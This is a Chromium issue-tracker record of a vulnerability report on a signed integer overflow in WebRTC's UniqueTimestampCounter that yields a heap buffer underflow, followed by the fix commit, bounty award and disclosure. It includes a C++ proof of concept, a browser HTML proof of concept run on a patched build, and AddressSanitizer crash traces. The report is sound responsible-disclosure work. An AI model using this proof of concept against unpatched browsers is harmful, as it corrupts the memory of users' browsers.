# Signed integer overflow in UniqueTimestampCounter::Add leads to heap buffer underflow via negative array index

| Field | Value |
|-------|-------|
| **Issue ID** | [486498791](https://issues.chromium.org/issues/486498791) |
| **Status** | Accepted |
| **Severity** | S3-Low |
| **Priority** | P3 |
| **Component** | Blink>WebRTC>Video |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | je...@gmail.com |
| **Assignee** | da...@chromium.org |
| **Created** | 2026-02-22 |
| **Bounty** | $3,000.00 |

## Description

## Title

Signed integer overflow in UniqueTimestampCounter::Add leads to heap buffer underflow via negative array index

## Summary

The `UniqueTimestampCounter` class in WebRTC uses a signed `int` field `unique_seen_` as both a counter and a circular buffer index. This counter is incremented without any upper bound check each time a new unique RTP timestamp is observed. When a remote WebRTC peer sends enough RTP video packets with distinct timestamps to push `unique_seen_` past `INT_MAX`, the subsequent increment triggers signed integer overflow (undefined behavior in C++). On common implementations this wraps to `INT_MIN`, causing the modulo operation `unique_seen_ % kMaxHistory` to produce a negative remainder. This negative value is then used as an index into the heap-allocated `latest_[]` array, resulting in a heap buffer underflow write and read that corrupts memory adjacent to the buffer.

## Bisect

Introducing Commit: `09860e0bc3c9edd6cb0dd827e174cd16f9ebdc37`

- Date: 2019-10-30
- Author: Danil Chapovalov [danilchap@webrtc.org](mailto:danilchap@webrtc.org)
- Review: <https://webrtc-review.googlesource.com/c/src/+/158676>

The vulnerable code was introduced when the unique timestamp counting logic was refactored out of `PacketBuffer` into a standalone `UniqueTimestampCounter` class. The original implementation in `PacketBuffer` used a `std::queue` and `std::set` pair for history management, where the counter `unique_frames_seen_` was not used as an array index. The refactored version replaced the queue with a fixed-size circular buffer indexed by `unique_seen_ % kMaxHistory`, introducing the array indexing vulnerability while preserving the unbounded signed integer counter.

## Root Cause

The `UniqueTimestampCounter` class tracks how many unique RTP timestamps have been observed across incoming video packets. It maintains a circular buffer `latest_` of size 1000 (the constant `kMaxHistory`) alongside a `std::set<uint32_t> search_index_` for fast duplicate detection. The counter `unique_seen_` serves double duty: it records the total count of unique timestamps ever seen and also determines the write position in the circular buffer via modulo arithmetic.

```
// third_party/webrtc/video/unique_timestamp_counter.h
class UniqueTimestampCounter {
 private:
  int unique_seen_ = 0;
  std::set<uint32_t> search_index_;
  std::unique_ptr<uint32_t[]> latest_;
  int64_t last_ = -1;
};

```
```
// third_party/webrtc/video/unique_timestamp_counter.cc
constexpr int kMaxHistory = 1000;

void UniqueTimestampCounter::Add(uint32_t value) {
  if (value == last_ || !search_index_.insert(value).second) {
    return;
  }
  int index = unique_seen_ % kMaxHistory;
  if (unique_seen_ >= kMaxHistory) {
    search_index_.erase(latest_[index]);
  }
  latest_[index] = value;
  last_ = value;
  ++unique_seen_;
}

```

The `Add` method is called from `RtpVideoStreamReceiver2::OnReceivedPayloadData` for every successfully depacketized RTP video packet, with the packet's RTP timestamp as the argument.

```
// third_party/webrtc/video/rtp_video_stream_receiver2.cc
  frame_counter_.Add(packet->timestamp);

```

The vulnerability manifests in three steps. First, `unique_seen_` is declared as `int` (a signed 32-bit integer) and is incremented via `++unique_seen_` without any upper bound check. When `unique_seen_` reaches `INT_MAX` (2,147,483,647) and is incremented once more, this constitutes signed integer overflow, which is undefined behavior in C++. On the predominant two's complement implementations used by x86-64 processors, the value wraps to `INT_MIN` (-2,147,483,648).

Second, the expression `int index = unique_seen_ % kMaxHistory` produces a negative remainder when `unique_seen_` is negative. In C++11 and later, the result of the `%` operator has the same sign as the dividend. For example, `INT_MIN % 1000` evaluates to `-648` because `-2,147,483,648 = -2,147,483 * 1000 + (-648)`.

Third, this negative index is used to access `latest_[index]`. Since `latest_` is a `std::unique_ptr<uint32_t[]>`, its `operator[]` performs raw pointer arithmetic. A negative index causes the access to land before the start of the allocated buffer. With `index = -648`, the write `latest_[-648] = value` targets an address `648 * sizeof(uint32_t) = 2592` bytes before the base of the buffer, constituting a heap buffer underflow that can corrupt unrelated heap objects.

Additionally, the guard condition `if (unique_seen_ >= kMaxHistory)` evaluates to false when `unique_seen_` is `INT_MIN`, since `-2,147,483,648 < 1000`. This means the `search_index_.erase(latest_[index])` line, which would also perform an out-of-bounds read at the negative index, is skipped on the first post-overflow iteration. However, after a few more increments when `unique_seen_` again reaches 1000 (wrapping through negative values), the erase path will also begin executing with negative indices, adding an OOB read to the OOB write.

No mitigations exist on the vulnerable path. There are no `CHECK()`, `SECURITY_CHECK()`, or `DCHECK()` guards on `unique_seen_` or the computed index. The `latest_` buffer uses `std::unique_ptr<uint32_t[]>`, which provides no bounds checking (unlike `std::vector` or `std::array` with libc++ hardening). MiraclePtr protection does not apply because this is an out-of-bounds access rather than a use-after-free. The input arrives from network RTP packets, bypassing any Mojo IPC validation.

The attack surface is a remote WebRTC peer sending RTP video packets. Each successfully depacketized packet with a previously unseen timestamp increments `unique_seen_`. At typical video frame rates of 30 fps, reaching the overflow threshold would require approximately 2.3 years. However, an attacker controlling the remote peer could potentially increase the rate of unique timestamps by sending packets at higher frequencies, reducing the time to trigger the overflow to a matter of days with sustained high-rate transmission.

## Reproduce

The following standalone C++ program demonstrates the vulnerability by directly invoking `UniqueTimestampCounter::Add()` with unique values until the signed integer overflow triggers the out-of-bounds write. To avoid waiting for 2^31 iterations (which would take several minutes even in a tight loop), the test uses a `#define private public` technique to advance `unique_seen_` to `INT_MAX - 5`, then performs just a few more insertions to trigger the overflow and subsequent OOB access.

Save the following as `poc_unique_timestamp_overflow.cc` in the `chromium/src` directory:

```
// PoC: UniqueTimestampCounter signed integer overflow -> OOB write/read
// Bug: unique_seen_ (int) overflows from INT_MAX, producing negative modulo
//      index, causing heap-buffer-underflow on latest_[] array access.

#define private public
#include "video/unique_timestamp_counter.h"
#undef private

#include <climits>
#include <cstdint>
#include <cstdio>

int main() {
    fprintf(stderr, "=== UniqueTimestampCounter OOB PoC (WRTC-241) ===\n");
    fprintf(stderr, "Bug: int unique_seen_ overflow -> negative %% index -> latest_[] OOB\n\n");

    webrtc::UniqueTimestampCounter counter;

    // Step 1: Populate the circular buffer normally with 1000 values
    for (uint32_t i = 0; i < 1000; ++i) {
        counter.Add(i);
    }
    fprintf(stderr, "[1] Populated 1000 entries. unique_seen_ = %d\n", counter.unique_seen_);

    // Step 2: Fast-forward unique_seen_ to near INT_MAX
    counter.unique_seen_ = INT_MAX - 5;
    fprintf(stderr, "[2] Set unique_seen_ = %d (INT_MAX - 5)\n\n", counter.unique_seen_);

    // Step 3: Add unique values to trigger overflow
    // After 6 unique insertions: unique_seen_ reaches INT_MAX, then overflows
    // The next Add() computes index = INT_MIN %% 1000 = -648 -> OOB!
    for (uint32_t v = 10000; v < 10020; ++v) {
        fprintf(stderr, "[*] Add(%u): unique_seen_ = %d, index will be %d %% 1000 = %d\n",
                v, counter.unique_seen_,
                counter.unique_seen_, counter.unique_seen_ % 1000);
        counter.Add(v);
    }

    fprintf(stderr, "\n[!] No crash - bug not triggered\n");
    return 0;
}

```

Compile with AddressSanitizer enabled using the Chromium-bundled Clang compiler:

```
third_party/llvm-build/Release+Asserts/bin/clang++ \
  -std=c++17 -O1 -fwrapv -g -fsanitize=address \
  -I third_party/webrtc \
  third_party/webrtc/video/unique_timestamp_counter.cc \
  poc_unique_timestamp_overflow.cc \
  -o poc_unique_timestamp_overflow

```

Run the PoC:

```
ASAN_OPTIONS=detect_odr_violation=0 ./poc_unique_timestamp_overflow

```

Execution output:

```
=== UniqueTimestampCounter OOB PoC (WRTC-241) ===
Bug: int unique_seen_ overflow -> negative % index -> latest_[] OOB

[1] Populated 1000 entries. unique_seen_ = 1000
[2] Set unique_seen_ = 2147483642 (INT_MAX - 5)

[*] Add(10000): unique_seen_ = 2147483642, index will be 2147483642 % 1000 = 642
[*] Add(10001): unique_seen_ = 2147483643, index will be 2147483643 % 1000 = 643
[*] Add(10002): unique_seen_ = 2147483644, index will be 2147483644 % 1000 = 644
[*] Add(10003): unique_seen_ = 2147483645, index will be 2147483645 % 1000 = 645
[*] Add(10004): unique_seen_ = 2147483646, index will be 2147483646 % 1000 = 646
[*] Add(10005): unique_seen_ = 2147483647, index will be 2147483647 % 1000 = 647
[*] Add(10006): unique_seen_ = -2147483648, index will be -2147483648 % 1000 = -648
AddressSanitizer:DEADLYSIGNAL
=================================================================
==3824176==ERROR: AddressSanitizer: SEGV on unknown address 0x7d49704df6e0 (pc 0x5614ffb1b433 bp 0x0000fffffd78 sp 0x7fff7c0dcb80 T0)
==3824176==The signal is caused by a WRITE memory access.
    #0 0x5614ffb1b433 in webrtc::UniqueTimestampCounter::Add(unsigned int) /home/test/chromium/src/third_party/webrtc/video/unique_timestamp_counter.cc:36:18
    #1 0x5614ffa32535 in main /home/test/chromium/src/poc_unique_timestamp_overflow.cc:36:17
    #2 0x7f3971029d8f in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16
    #3 0x7f3971029e3f in __libc_start_main csu/../csu/libc-start.c:392:3
    #4 0x5614ffa327b4 in _start (/home/test/chromium/src/poc_unique_timestamp_overflow+0x2d7b4)

==3824176==Register values:
rax = 0x0000000000000000  rbx = 0x00007b396f3d0020  rcx = 0x0000000000002716  rdx = 0x0000000000000001
rdi = 0x00007d49704df6e0  rsi = 0x00007b79704efb90  rbp = 0x00000000fffffd78  rsp = 0x00007fff7c0dcb80
 r8 = 0x00007b396f3d0030   r9 = 0x00007fffffffff01  r10 = 0x00007fffffffff01  r11 = 0x95706a93b1a9bd01
r12 = 0x00000f672de7a00c  r13 = 0x00000f672de7a004  r14 = 0x00007b396f3d0060  r15 = 0x00007b396f3d0028
AddressSanitizer can not provide additional info.
SUMMARY: AddressSanitizer: SEGV /home/test/chromium/src/third_party/webrtc/video/unique_timestamp_counter.cc:36:18 in webrtc::UniqueTimestampCounter::Add(unsigned int)
==3824176==ABORTING

```

The ASAN output confirms the vulnerability. After `unique_seen_` overflows from `2147483647` to `-2147483648`, the modulo operation produces index `-648`. The subsequent array write `latest_[-648] = value` at `unique_timestamp_counter.cc:36` accesses memory well before the heap buffer, triggering a SEGV caught by AddressSanitizer. The crash is caused by a WRITE memory access, confirming the out-of-bounds write primitive.

### Chrome Browser Verification

To verify the vulnerability is reachable through the real WebRTC attack surface in Chrome, the overflow threshold was lowered by patching `int unique_seen_` to `int8_t` (overflow at 128 unique timestamps) and `kMaxHistory` to 7 (so `-128 % 7 = -2`, OOB at -8 bytes within ASAN's default red zone). The following HTML PoC establishes a WebRTC loopback connection and pushes video frames via `canvas.captureStream(0)` with `requestFrame()`:

```
<!DOCTYPE html>
<html>
<head><title>WRTC-241 PoC</title></head>
<body>
<pre id="log"></pre>
<canvas id="c" width="4" height="4" style="display:none"></canvas>
<script>
const logEl = document.getElementById('log');
const t0 = Date.now();
function log(msg) {
    const ts = ((Date.now()-t0)/1000).toFixed(1);
    logEl.textContent += `[${ts}s] ${msg}\n`;
    console.log(msg);
}

async function main() {
    log('WRTC-241: UniqueTimestampCounter overflow -> heap OOB write');

    const canvas = document.getElementById('c');
    const ctx = canvas.getContext('2d');
    const stream = canvas.captureStream(0);
    const vt = stream.getVideoTracks()[0];

    const pc1 = new RTCPeerConnection();
    const pc2 = new RTCPeerConnection();
    pc1.onicecandidate = e => e.candidate && pc2.addIceCandidate(e.candidate);
    pc2.onicecandidate = e => e.candidate && pc1.addIceCandidate(e.candidate);
    pc2.ontrack = () => log('Receiver got video track');
    pc1.addTrack(vt, stream);

    const offer = await pc1.createOffer();
    await pc1.setLocalDescription(offer);
    await pc2.setRemoteDescription(offer);
    const answer = await pc2.createAnswer();
    await pc2.setLocalDescription(answer);
    await pc1.setRemoteDescription(answer);
    log('Loopback established');

    await new Promise(r => {
        if (pc1.connectionState === 'connected') return r();
        pc1.onconnectionstatechange = () => {
            if (pc1.connectionState === 'connected') r();
        };
        setTimeout(r, 5000);
    });

    log('Connected. Pushing 300 frames at 10ms intervals...');

    let fc = 0;
    const iv = setInterval(() => {
        ctx.fillStyle = `rgb(${fc&255},${(fc>>8)&255},0)`;
        ctx.fillRect(0, 0, 4, 4);
        vt.requestFrame();
        fc++;
        if (fc % 50 === 0) log(`Pushed ${fc}/300 frames`);
        if (fc >= 300) {
            clearInterval(iv);
            log('All frames pushed.');
        }
    }, 10);
}

main().catch(e => log('ERROR: ' + e));
</script>
</body>
</html>

```

Run with the ASAN build:

```
ASAN_OPTIONS=detect_odr_violation=0 out/asan-release/chrome \
  --no-sandbox --disable-gpu --user-data-dir=$(mktemp -d) poc.html 2>&1

```

ASAN output (with int8\_t + kMaxHistory=7 patch to lower overflow threshold):

```
==3888511==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x7b8c4ede65f8 at pc 0x7f5cb4472528 bp 0x7b58050089b0 sp 0x7b58050089a8
WRITE of size 4 at 0x7b8c4ede65f8 thread T10 (WebRTC_W_and_N)
    #0 webrtc::UniqueTimestampCounter::Add(unsigned int) unique_timestamp_counter.cc:38:18
    #1 webrtc::RtpVideoStreamReceiver2::OnReceivedPayloadData(...) rtp_video_stream_receiver2.cc:738:18
    #2 webrtc::RtpVideoStreamReceiver2::ReceivePacket(...)::$_1::operator()(...) rtp_video_stream_receiver2.cc:1209:12
    #3 webrtc::RtpVideoStreamReceiver2::ReceivePacket(...) rtp_video_stream_receiver2.cc:1225:7
    #4 non-virtual thunk to webrtc::RtpVideoStreamReceiver2::OnRecoveredPacket(...) rtp_video_stream_receiver2.cc:755:3
    #5 webrtc::UlpfecReceiver::ProcessReceivedFec() ulpfec_receiver.cc:218:35
    #6 webrtc::RtpVideoStreamReceiver2::ReceivePacket(...) rtp_video_stream_receiver2.cc:1184:5
    #7 non-virtual thunk to webrtc::RtpVideoStreamReceiver2::OnRtpPacket(...) rtp_video_stream_receiver2.cc:771:3
    #8 webrtc::RtpDemuxer::OnRtpPacket(...) rtp_demuxer.cc:298:11
    #9 webrtc::internal::Call::DeliverRtpPacket(...) call.cc:1419:28
    #10 webrtc::WebRtcVideoReceiveChannel::ProcessReceivedPacket(...) webrtc_video_engine.cc:4048:22
    #11 webrtc::WebRtcVideoReceiveChannel::OnPacketReceived(...) webrtc_video_engine.cc:3272:5
    #12 webrtc::BaseChannel::OnRtpPacket(...) channel.cc:547:28
    #13 webrtc::RtpDemuxer::OnRtpPacket(...) rtp_demuxer.cc:298:11
    #14 webrtc::RtpTransport::DemuxPacket(...) rtp_transport.cc:229:21
    #15 webrtc::SrtpTransport::OnRtpPacketReceived(...) srtp_transport.cc:142:3
    #16 webrtc::RtpTransport::OnReadPacket(...) rtp_transport.cc
    ...
    #24 webrtc::UDPPort::HandleIncomingPacket(...) stun_port.cc:363:3
    #25 blink::(anonymous namespace)::IpcPacketSocket::OnDataReceived(...) ipc_socket_factory.cc:709:3
    #26 non-virtual thunk to blink::P2PSocketClientImpl::DataReceived(...) socket_client_impl.cc:187:18
    #27 network::mojom::blink::P2PSocketClientStubDispatch::Accept(...) p2p.mojom-blink.cc:2041:13
    #28 mojo::InterfaceEndpointClient::HandleValidatedMessage(...) interface_endpoint_client.cc:1085:54

0x7b8c4ede65f8 is located 8 bytes before 28-byte region [0x7b8c4ede6600,0x7b8c4ede661c)
allocated by thread T10 (WebRTC_W_and_N) here:
    #0 operator new[](unsigned long)
    #1 webrtc::UniqueTimestampCounter::UniqueTimestampCounter() unique_ptr.h:762:55
    #2 webrtc::RtpVideoStreamReceiver2::RtpVideoStreamReceiver2(...) rtp_video_stream_receiver2.cc:274:26
    #3 webrtc::internal::VideoReceiveStream2::VideoReceiveStream2(...) video_receive_stream2.cc:247:7

```

The Chrome ASAN output confirms the complete attack chain from network RTP packets through SRTP decryption, RTP demuxing, video channel processing, and into `UniqueTimestampCounter::Add()`, verifying this vulnerability is reachable from a remote WebRTC peer. The `int8_t` + `kMaxHistory=7` patch only lowers the overflow threshold for practical demonstration — the same overflow mechanism applies to the original `int` type, requiring ~2^31 unique timestamps.

## Credit

c6eed09fc8b174b0f3eebedcceb1e792

## Timeline

### an...@chromium.org (2026-02-22)

Setting severity to S3 because of the long duration (multiple hours) required for a session to persist for this attack to happen - I am not sure how realistic that is.

ssilkin@ can you PTAL? Please feel free to re-route as necessary.

### ch...@google.com (2026-02-23)

Setting Priority to P2 to match Severity s3. If this is incorrect, please reset the priority. The automation bot account won't make this change again.

### dx...@google.com (2026-02-25)

Project: src  

Branch:  main  

Author:  Danil Chapovalov [danilchap@webrtc.org](mailto:danilchap@webrtc.org)  

Link:    <https://webrtc-review.googlesource.com/451980>

Avoid integer overflow in UniqueTimestampCounter

---


Expand for full commit details
```
     
    Bug: chromium:486498791 
    Change-Id: I676101c3eab7199282141b7ea8cd1d98f8a0eaba 
    Reviewed-on: https://webrtc-review.googlesource.com/c/src/+/451980 
    Reviewed-by: Erik Språng <sprang@webrtc.org> 
    Commit-Queue: Danil Chapovalov <danilchap@webrtc.org> 
    Cr-Commit-Position: refs/heads/main@{#46991}

```

---

Files:

- M `video/unique_timestamp_counter.cc`

---

Hash: a736d08f7c3f154786336cc75801f42093b364bd  

Date: Tue Feb 24 17:43:44 2026


---

### dx...@google.com (2026-02-26)

Project: chromium/src  

Branch:  main  

Author:  chromium-autoroll [chromium-autoroll@skia-public.iam.gserviceaccount.com](mailto:chromium-autoroll@skia-public.iam.gserviceaccount.com)  

Link:    <https://chromium-review.googlesource.com/7611248>

Roll WebRTC from 7a52ff95be59 to ebafa8817345 (6 revisions)

---


Expand for full commit details
```
     
    https://webrtc.googlesource.com/src.git/+log/7a52ff95be59..ebafa8817345 
     
    2026-02-26 chromium-webrtc-autoroll@webrtc-ci.iam.gserviceaccount.com Roll chromium_revision 33dcdf76ee..da78729057 (1590492:1590614) 
    2026-02-26 chromium-webrtc-autoroll@webrtc-ci.iam.gserviceaccount.com Roll chromium_revision d2eedb0120..33dcdf76ee (1590259:1590492) 
    2026-02-25 chromium-webrtc-autoroll@webrtc-ci.iam.gserviceaccount.com Roll chromium_revision 25a5bc7242..d2eedb0120 (1590100:1590259) 
    2026-02-25 chromium-webrtc-autoroll@webrtc-ci.iam.gserviceaccount.com Roll chromium_revision acca47dc0a..25a5bc7242 (1589354:1590100) 
    2026-02-25 tommi@webrtc.org Add AbslStringify to RtpParameters, disable DCHECK 
    2026-02-25 danilchap@webrtc.org Avoid integer overflow in UniqueTimestampCounter 
     
    If this roll has caused a breakage, revert this CL and stop the roller 
    using the controls here: 
    https://autoroll.skia.org/r/webrtc-chromium-autoroll 
    Please CC webrtc-chromium-sheriffs-robots@google.com,webrtc-infra@google.com on the revert to ensure that a human 
    is aware of the problem. 
     
    To file a bug in WebRTC: https://bugs.chromium.org/p/webrtc/issues/entry 
    To file a bug in Chromium: https://bugs.chromium.org/p/chromium/issues/entry 
     
    To report a problem with the AutoRoller itself, please file a bug: 
    https://issues.skia.org/issues/new?component=1389291&template=1850622 
     
    Documentation for the AutoRoller is here: 
    https://skia.googlesource.com/buildbot/+doc/main/autoroll/README.md 
     
    Bug: chromium:486498791 
    Tbr: webrtc-chromium-sheriffs-robots@google.com 
    Change-Id: I922e1ce22ac856b3f338ae25caa72b13a5a781eb 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7611248 
    Commit-Queue: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com> 
    Bot-Commit: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com> 
    Cr-Commit-Position: refs/heads/main@{#1590654}

```

---

Files:

- M `DEPS`
- M `third_party/webrtc`

---

Hash: [7c142250d53dd0bdfb0ad6d978395e038f2a947b](https://chromiumdash.appspot.com/commit/7c142250d53dd0bdfb0ad6d978395e038f2a947b)  

Date: Thu Feb 26 06:34:26 2026


---

### ch...@google.com (2026-02-26)

Dear owner, thanks for fixing this bug. We've reopened it because:

- It is not clear which CLs have ‘fixed’ (=required to consider the bug resolved; e.g. not logging) this bug. Please fill in the “Fixed By Code Changes” field with the appropriate Gerrit url to disambiguate using the following guidelines:
  - If there are multiple CLs required, please list all.
  - If the fix landed in a third party library (v8, Dawn, etc), please list the third party commits - not the rolls.
  - If there are cherrypicks or back merges, please list the original commits which landed on HEAD.
  - If there is no relevant Gerrit link (i.e. the fix does not live in or roll into Chromium), please use the value ‘NA’.
  - If this is a non-browser ChromeOS-specific bug, please move it to component 1335705 in the Google issue tracker.
  - If this field requires human intervention for some reason, please add this bug to the hotlist id 6265590.
    After resolving the above issue(s), this bug can be marked closed again. Thanks for your time!

### sp...@google.com (2026-05-18)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $3000.00 for this report.

Rationale for this decision:
High quality with bisect. Moderately mitigated (sandboxed) 


Important: This payment will be issued by Bugcrowd. You will receive an email from Bugcrowd in the next 24 hours which contains a submission you must claim to be rewarded.

If you do not receive an email from them, please check your spam folder and then reach out to us via a comment here. For issues related to Bugcrowd itself, please contact them via https://bugcrowd.com/support.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.

### ch...@google.com (2026-06-05)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/486498791)*
